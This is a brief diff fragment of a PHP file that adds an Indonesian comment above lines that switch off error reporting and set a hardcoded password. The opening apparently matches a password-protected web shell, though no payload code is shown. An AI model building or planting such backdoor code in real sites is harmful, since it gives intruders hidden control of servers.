@@ -1,4 +1,5 @@
 <?php
+// Hayo ngapain 
 error_reporting(0);
 $password='oit';
 $xyn='psatir';
